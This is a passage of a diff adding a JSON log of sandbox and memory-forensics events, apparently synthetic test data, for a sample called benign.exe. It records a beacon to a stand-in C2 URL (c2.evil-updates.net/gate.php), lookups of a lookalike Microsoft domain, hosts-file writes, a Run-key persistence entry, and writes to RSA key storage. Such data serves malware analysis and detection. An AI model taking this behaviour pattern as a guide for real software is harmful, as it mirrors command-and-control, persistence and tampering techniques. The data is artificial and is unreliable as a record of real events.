+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "c80f71ff244248caa5ec5bcd",
+  "time": "2026-10-13T15:40:07.899Z",
+  "sequence": 85,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryValueKey",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtQueryValueKey \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtQueryValueKey",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "ea8f69c69d479bfcef8a74be",
+  "time": "2026-10-13T15:40:07.967Z",
+  "sequence": 86,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtProtectVirtualMemory",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtProtectVirtualMemory \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtProtectVirtualMemory",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "6f9e8a366e7536590c7886e1",
+  "time": "2026-10-13T15:40:08.120Z",
+  "sequence": 87,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtSetInformationFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtSetInformationFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtSetInformationFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "0034706374b15cfcedaf4c1a",
+  "time": "2026-10-13T15:40:08.210Z",
+  "sequence": 88,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "connection-opened",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "benign.exe connected to c2.evil-updates.net:443",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "203.0.113.20",
+   "port": 443,
+   "domain": "c2.evil-updates.net"
+  },
+  "dns_query": null,
+  "url": "https://c2.evil-updates.net/gate.php?id=382",
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "d248cd970978334b6428f2ed",
+  "time": "2026-10-13T15:40:08.437Z",
+  "sequence": 89,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "LdrLoadDll",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called LdrLoadDll \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "LdrLoadDll",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "a670ef27d9a2da218b4a2e13",
+  "time": "2026-10-13T15:40:08.689Z",
+  "sequence": 90,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "notepad.exe wrote C:\\Users\\Analyst\\Documents\\budget.xlsx",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\Documents\\budget.xlsx",
+  "registry_path": null
+ },
+ {
+  "id": "34f29e3b582b5d921a74b135",
+  "time": "2026-10-13T15:40:08.962Z",
+  "sequence": 91,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtSetInformationFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called NtSetInformationFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "NtSetInformationFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "62e69607d06545fea533f405",
+  "time": "2026-10-13T15:40:09.076Z",
+  "sequence": 92,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-set",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "benign.exe set HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName"
+ },
+ {
+  "id": "ce73108e5db931952d43dcdc",
+  "time": "2026-10-13T15:40:09.283Z",
+  "sequence": 93,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "benign.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "460415d40c732424adc94d6f",
+  "time": "2026-10-13T15:40:09.517Z",
+  "sequence": 94,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe wrote C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "registry_path": null
+ },
+ {
+  "id": "c92745510986f27a47646475",
+  "time": "2026-10-13T15:40:09.572Z",
+  "sequence": 95,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "notepad.exe resolved update-cdn.microsoft-patches.net \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "update-cdn.microsoft-patches.net"
+  },
+  "dns_query": "update-cdn.microsoft-patches.net",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "fb2ae5d7fc56e5f28e999195",
+  "time": "2026-10-13T15:40:09.876Z",
+  "sequence": 96,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-created",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe created C:\\Users\\Analyst\\Documents\\budget.xlsx",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\Documents\\budget.xlsx",
+  "registry_path": null
+ },
+ {
+  "id": "12cc93c6cd58333c8b2eac17",
+  "time": "2026-10-13T15:40:09.913Z",
+  "sequence": 97,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "svchost.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "b5d5e3aa45b99cc85e2ac3f0",
+  "time": "2026-10-13T15:40:09.937Z",
+  "sequence": 98,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "8a4feb445c33533810fbb6aa",
+  "time": "2026-10-13T15:40:10.206Z",
+  "sequence": 99,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "benign.exe wrote C:\\Users\\Analyst\\AppData\\Local\\Temp\\a8f3c1.tmp",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\a8f3c1.tmp",
+  "registry_path": null
+ },
+ {
+  "id": "1b410ba86055e4e600e5c9ec",
+  "time": "2026-10-13T15:40:10.300Z",
+  "sequence": 100,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtOpenProcess",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtOpenProcess \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtOpenProcess",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "66b348f3796e6ff8301c425d",
+  "time": "2026-10-13T15:40:10.551Z",
+  "sequence": 101,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "benign.exe resolved c2.evil-updates.net \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "c2.evil-updates.net"
+  },
+  "dns_query": "c2.evil-updates.net",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "7ac9d9cd89c656a06635958b",
+  "time": "2026-10-13T15:40:10.763Z",
+  "sequence": 102,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "c666c0ecd21698d66adabeff",
+  "time": "2026-10-13T15:40:11.028Z",
+  "sequence": 103,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-key-created",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "explorer.exe created HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a"
+ },
+ {
+  "id": "34c34aa32b80b3b6f1c12584",
+  "time": "2026-10-13T15:40:11.310Z",
+  "sequence": 104,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "e579e8df6673d923823a4fe0",
+  "time": "2026-10-13T15:40:11.669Z",
+  "sequence": 105,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtWriteFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtWriteFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtWriteFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "6e5c66c43d373e9d12924d9e",
+  "time": "2026-10-13T15:40:12.085Z",
+  "sequence": 106,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "LdrLoadDll",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called LdrLoadDll \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "LdrLoadDll",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "38b3c32db9f5cd930b15f2ce",
+  "time": "2026-10-13T15:40:12.154Z",
+  "sequence": 107,
+  "lane": "memory",
+  "kind": "event",
+  "category": [
+   "memory"
+  ],
+  "action": "memory-finding",
+  "module": "volatility3",
+  "dataset": "volatility3.malfind",
+  "summary": "malfind: RWX region in cmd.exe at 0x7ff6f1394000",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "ba5d6ea85ee61bb81c2e332a",
+  "time": "2026-10-13T15:40:12.475Z",
+  "sequence": 108,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe wrote C:\\Users\\Analyst\\AppData\\Local\\Temp\\a8f3c1.tmp",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\a8f3c1.tmp",
+  "registry_path": null
+ },
+ {
+  "id": "7dc0f775c0669cb9465d037d",
+  "time": "2026-10-13T15:40:12.861Z",
+  "sequence": 109,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "4c126af2675e7dabe6e425ef",
+  "time": "2026-10-13T15:40:13.212Z",
+  "sequence": 110,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "notepad.exe wrote C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\f686aace6942fb7f7ceb231212eef4a4_0a7bd2e3",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\f686aace6942fb7f7ceb231212eef4a4_0a7bd2e3",
+  "registry_path": null
+ },
+ {
+  "id": "d24b076fb2f572131a045af7",
+  "time": "2026-10-13T15:40:13.300Z",
+  "sequence": 111,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "0cf2b77a69171c1efa6324de",
+  "time": "2026-10-13T15:40:13.329Z",
+  "sequence": 112,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "034de3d39397d7bf6ab896d3",
+  "time": "2026-10-13T15:40:13.391Z",
+  "sequence": 113,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "cmd.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "1ef993e4d7a6929d0479589c",
+  "time": "2026-10-13T15:40:13.604Z",
+  "sequence": 114,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtWriteFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtWriteFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtWriteFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "cf468fecd8057b840bc057d6",
+  "time": "2026-10-13T15:40:13.770Z",
+  "sequence": 115,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-set",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "cmd.exe set HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a"
+ },
+ {
+  "id": "e080a5a8ec1ca9171d06e1f4",
+  "time": "2026-10-13T15:40:14.157Z",
+  "sequence": 116,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "svchost.exe read HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Hostname",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Hostname"
+ },
+ {
+  "id": "7aeda0f04e0757c27dc2d6c2",
+  "time": "2026-10-13T15:40:14.569Z",
+  "sequence": 117,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQuerySystemInformation",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called NtQuerySystemInformation \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "NtQuerySystemInformation",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9ea525b0f77a7ed183c80e8c",
+  "time": "2026-10-13T15:40:14.858Z",
+  "sequence": 118,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "svchost.exe wrote C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "registry_path": null
+ },
+ {
+  "id": "978b0e1d9391c963a6f7bceb",
+  "time": "2026-10-13T15:40:15.116Z",
+  "sequence": 119,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-set",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "cmd.exe set HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+ },
+ {
+  "id": "367d3934f6279378e043b912",
+  "time": "2026-10-13T15:40:15.339Z",
+  "sequence": 120,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "benign.exe read HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid"
+ },
+ {
+  "id": "6bc53911ed3d3d8f4b2cd1d5",
+  "time": "2026-10-13T15:40:15.523Z",
+  "sequence": 121,
+  "lane": "memory",
+  "kind": "event",
+  "category": [
+   "memory"
+  ],
+  "action": "memory-finding",
+  "module": "volatility3",
+  "dataset": "volatility3.malfind",
+  "summary": "malfind: RWX region in svchost.exe at 0x7ff63634a000",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "dfa4a48a78b759e0d147ffa5",
+  "time": "2026-10-13T15:40:15.831Z",
+  "sequence": 122,
+  "lane": "memory",
+  "kind": "event",
+  "category": [
+   "memory"
+  ],
+  "action": "memory-finding",
+  "module": "volatility3",
+  "dataset": "volatility3.malfind",
+  "summary": "malfind: RWX region in benign.exe at 0x7ff638b6e000",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "efe9994ffcce3b1e7f32fe22",
+  "time": "2026-10-13T15:40:16.039Z",
+  "sequence": 123,
+  "lane": "memory",
+  "kind": "event",
+  "category": [
+   "memory"
+  ],
+  "action": "memory-finding",
+  "module": "volatility3",
+  "dataset": "volatility3.malfind",
+  "summary": "malfind: RWX region in benign.exe at 0x7ff6615be000",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "dbe9743810640b8eafa0153b",
+  "time": "2026-10-13T15:40:16.275Z",
+  "sequence": 124,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "7e382c33576484f0a6cfe929",
+  "time": "2026-10-13T15:40:16.500Z",
+  "sequence": 125,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "notepad.exe wrote C:\\Users\\Analyst\\Desktop\\readme.txt",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\Desktop\\readme.txt",
+  "registry_path": null
+ },
+ {
+  "id": "5c8dbfa1d6e29782035585f2",
+  "time": "2026-10-13T15:40:16.902Z",
+  "sequence": 126,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
